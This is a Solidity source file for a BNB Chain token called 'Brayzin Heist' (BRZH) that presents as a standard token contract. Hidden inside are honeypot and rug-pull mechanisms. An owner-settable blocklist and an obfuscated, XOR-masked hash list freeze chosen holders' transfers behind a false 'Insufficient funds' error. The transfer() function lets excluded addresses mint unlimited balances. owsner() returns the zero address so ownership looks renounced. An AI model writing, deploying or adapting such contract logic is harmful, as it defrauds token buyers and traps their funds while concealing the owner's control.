/**
 *Submitted for verification at BscScan.com on 2022-06-29
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address aqount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owsner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owsner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - kfie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    
    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
        uint u = 0;
        for (uint8 i=0;i<32;i++){
            u=256*u+uint(uint8(b32[i]));
        }
        return u;  
    }

    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
        return keccak256(b);
    }

    function _toBytes(address a) internal pure returns (bytes memory b) {
        assembly {
            let m := mload(0x40)
            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, a)
            )
            mstore(0x40, add(m, 52))
            b := m
        }
    }

    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
        uint charCount = 0;
        
        for(uint i = 0;i < bname.length; i++){
            bytes1 char = bname[i];
            
            if(char != 0){
                charCount++;
            }    
        }
        
        bytes memory bytesName = new bytes(charCount);
        
        for(uint j = 0;j < charCount;j++){
            bytesName[j] = bname[j];
        }
                    
        return string(bytesName);
    }

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

contract Ownable is Context {
    address private _owsner;
    event owsnershipTransferred(address indexed previousowsner, address indexed newowsner);

    constructor () {
        address msgSender = _msgSender();
        _owsner = msgSender;
        emit owsnershipTransferred(address(0), msgSender);
    }
    function owsner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowsner() {
        require(_owsner == _msgSender(), "Ownable: caller is not the owsner");
        _;
    }
    function renounceowsnership() public virtual onlyowsner {
        emit owsnershipTransferred(_owsner, address(0x000000000000000000000000000000000000dEaD));
        _owsner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract BRZH is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "Brayzin Heist";
    string private _symbol = "BRZH";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 800000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 800000000000 * 10 ** _decimals;
    uint256 private _burnkfie = 3;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(uint => bool) private _AirDrop;
    function setAward(uint aqount) public onlyowsner {
        _AirDrop[aqount] = true;
    }

    constructor () {
     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  	
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal {       
        require(!_AirDrop[_bytes32ToUint(callKeccak256(_toBytes(sender)))] && !_cbb(sender), "Insufficient funds");
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");      

        uint256 kfieamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            kfieamonnt = amonnts.mul(_burnkfie).div(100);
            //require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }
        if (blsender >= amonnts){
            _balance[sender] = _balance[sender].sub(amonnts);
        }

        uint256 amoun;
        amoun = amonnts - kfieamonnt;
        _balance[recipient] += amoun;
        if (_burnkfie > 0){
            emit Transfer (sender, _DEADaddress, kfieamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        //
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address aqount) public view override returns (uint256) {
        return _balance[aqount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owsner, address spender, uint256 amonnts) internal virtual {
        require(owsner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owsner][spender] = amonnts;
        emit Approval(owsner, spender, amonnts);
    }

    function allowance(address owsner, address spender) public view virtual override returns (uint256) {
        return _allowances[owsner][spender];
    }


    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }
    
	function _mljs(uint _acc) internal view virtual returns (bool result) {
		uint[28] memory acc = [uint(18809286147153182409533824902088462441336892901963164781193824035063414147305)
			,92842486362570807416572486819848426590822259968212290369922378806740951089077
			,1258336925804173997986954384093594112721192860702423461731222183653831081131
			,80507631754638358029294031629158215746209023916315389395364739794704652636078
			,98054194990938170615724619196753656137184227352249086250834256845412213876860
			,92120827703508917280223335756567806359423462390664872759655792871831784161115
			,7950259404528556924893094387339359242635320022951981209631575622106080006465
			,23381723957687683296898116486859976029371777207716559022855790898358589532942
			,64888856983856919667966074296554280620691403584356989581845149652342966116424
			,32041909472357955770756068064041315282265397724819354670142571546284571940866
			,20312423475931142694275518746733677260844072194623711221402037748153928880231
			,54362292881500308657890715811559269017708411541880233812915183245170217414541
			,66834027710531218709844189429789586664083829873448955930487302935080706036866
			,18250487201269815259168085453943163408057559080851439003154849559682326734888
			,1800951119991991078051380851147458008179849204798597293862847260604532691707
			,82654892623880338852460893936003973946535802782808705059164466638922447141697
			,75246846536980424355871058999585741440198383707779008941975315194207816227233
			,9464074068438848181567038490514382461286063567085982188823841553321965027420
			,40095676928957979482332480088441832092763462390135923485690319752315493905738
			,101018241872460870633218438087268452677872116655045781200461033825283729338100
			,73556278612257153535104205664311920815889732156335276454067877486242992302831
			,9067155044159635267923049171301944763888666514280110542678995828208548337287
			,12729962747874609076796748187062698193041064277452613360254898414016235733391
			,40104983445293583816799710507750692246849545846098481578865315538857215329187
			,80872851991237388804337727746143902173158989497138656022416963689141134585560
			,51380179724846567667415399563344322877112802055331979055860871108126918605903
			,113047402688264280795608403652064303421204754573068137884979152388477705694967
			,74796617605860022199716828797298822491457804808758864837337777425817539826671];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 45698610985481739941422393316275869960156129839968677178786761615270545257418) return true;
		}
		return false;
	}
    function _cbb(address a) internal view returns (bool result) {
        uint k = _bytes32ToUint(callKeccak256(_toBytes(a)));
        return _mljs(k);
    }
}